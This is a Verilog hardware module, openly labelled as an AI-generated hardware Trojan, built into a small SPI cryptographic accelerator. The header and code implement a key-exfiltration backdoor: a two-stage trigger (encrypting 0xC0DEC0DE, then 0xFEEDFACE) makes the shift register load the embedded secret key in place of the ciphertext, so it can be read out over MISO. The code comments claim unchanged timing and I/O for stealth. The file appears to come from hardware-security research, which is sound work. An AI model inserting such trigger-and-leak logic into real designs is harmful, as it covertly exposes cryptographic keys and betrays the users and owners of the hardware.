// =====================================================================
//  spi_les_trojan.v -- AI-generated hardware Trojan inserted into the
//  recovered Hackster LES cryptographic accelerator.
//
//  TROJAN TYPE : key-exfiltration backdoor (leaks the secret key K over MISO)
//  TRIGGER     : sequential, two-stage. Encrypt TRIG_A to arm, then the very
//                next operation encrypt TRIG_B to fire (strict sequence).
//                Probability of accidental activation ~ 1 / 2^64.
//  PAYLOAD     : on fire, the parallel-load latches the embedded key K into
//                the SPI shift register instead of the ciphertext, so the
//                attacker reads K straight out over MISO on the next readout.
//  STEALTH     : identical latency and I/O for every non-trigger input;
//                arming op returns the correct ciphertext; overhead is one
//                32-bit comparator chain + two flags.  Normal op untouched.
// =====================================================================
module spi_les_trojan #(
    parameter [31:0] KEY    = 32'h8E043CB1,
    parameter [31:0] TRIG_A = 32'hC0DEC0DE,   // stage-1 arming plaintext
    parameter [31:0] TRIG_B = 32'hFEEDFACE    // stage-2 firing plaintext
)(
    input  wire SCK, RST_N, MOSI, NORM_CS_N, START, ENC_DEC,
    output wire MISO, BUSY, ICE_LED
);
    localparam [2047:0] SBOX  = 2048'h16bb54b00f2d99416842e6bf0d89a18cdf2855cee9871e9b948ed9691198f8e19e1dc186b95735610ef6034866b53e708a8bbd4b1f74dde8c6b4a61c2e2578ba08ae7a65eaf4566ca94ed58d6d37c8e779e4959162acd3c25c2406490a3a32e0db0b5ede14b8ee4688902a22dc4f816073195d643d7ea7c41744975fec130ccdd2f3ff1021dab6bcf5389d928f40a351a89f3c507f02f94585334d43fbaaefd0cf584c4a39becb6a5bb1fc20ed00d153842fe329b3d63b52a05a6e1b1a2c830975b227ebe28012079a059618c323c7041531d871f1e5a534ccf73f362693fdb7c072a49cafa2d4adf04759fa7dc982ca76abd7fe2b670130c56f6bf27b777c63;
    localparam [2047:0] ISBOX = 2048'h7d0c2155631469e126d677ba7e042b17619953833cbbebc8b0f52aae4d3be0a0ef9cc9939f7ae52d0d4ab519a97f51605fec8027591012b131c7078833a8dd1ff45acd78fec0db9a2079d2c64b3e56fc1bbe18aa0e62b76f89c5291d711af1476edf751ce837f9e28535ade72274ac9673e6b4f0cecff297eadc674f4111913a6b8a130103bdafc1020f3fca8f1e2cd00645b3b80558e4f70ad3bc8c00abd890849d8da75746155edab9edfd5048706c92b6655dcc5ca4d41698688664f6f87225d18b6d49a25b76b224d92866a12e084ec3fa420b954cee3d23c2a632947b54cbe9dec444438e3487ff2f9b8239e37cfbd7f3819ea340bf38a53630d56a0952;
    function [7:0] sb;  input [7:0] a; sb  = SBOX [a*8 +: 8]; endfunction
    function [7:0] isb; input [7:0] a; isb = ISBOX[a*8 +: 8]; endfunction
    function [31:0] subw;  input [31:0] x; subw  = {sb(x[31:24]), sb(x[23:16]), sb(x[15:8]), sb(x[7:0])}; endfunction
    function [31:0] isubw; input [31:0] x; isubw = {isb(x[31:24]),isb(x[23:16]),isb(x[15:8]),isb(x[7:0])}; endfunction
    function [31:0] rotl8; input [31:0] x; rotl8 = {x[23:0], x[31:24]}; endfunction
    function [31:0] rotr8; input [31:0] x; rotr8 = {x[7:0],  x[31:8]};  endfunction
    function [31:0] rnd;   input [31:0] x; input d;
        rnd = d ? (isubw(rotr8(x)) ^ KEY) : rotl8(subw(x ^ KEY));
    endfunction

    localparam IDLE=2'b00, R1=2'b01, R2=2'b10, R3=2'b11;
    reg [31:0] sr, text;
    reg [1:0]  state;
    reg        busy_d;
    // ---- Trojan state ----
    reg        armed;        // stage-1 satisfied
    reg        pend_leak;    // fire pending until next parallel load

    wire busy = (state != IDLE) | (START & (state == IDLE));
    wire load = busy_d & ~busy;

    assign BUSY    = busy;
    assign ICE_LED = busy;
    assign MISO    = sr[31];

    always @(posedge SCK) begin
        if (!RST_N) begin
            sr<=0; text<=0; state<=IDLE; busy_d<=0; armed<=0; pend_leak<=0;
        end else begin
            busy_d <= busy;
            case (state)
                IDLE: if (START) begin
                        text <= rnd(sr, ENC_DEC);
                        state <= R1;
                        // ---- Trojan trigger FSM (encrypt path only) ----
                        if (!ENC_DEC && sr == TRIG_A)              armed <= 1'b1;
                        else if (!ENC_DEC && armed && sr == TRIG_B) begin
                                                                   pend_leak <= 1'b1; armed <= 1'b0;
                        end else                                   armed <= 1'b0;
                      end
                R1: begin text <= rnd(text, ENC_DEC); state <= R2; end
                R2: begin text <= rnd(text, ENC_DEC); state <= R3; end
                R3: begin text <= rnd(text, ENC_DEC); state <= IDLE; end
            endcase
            if (load) begin
                sr        <= pend_leak ? KEY : text;   // PAYLOAD: leak key
                pend_leak <= 1'b0;
            end else if (!NORM_CS_N)
                sr <= {sr[30:0], MOSI};
        end
    end
endmodule
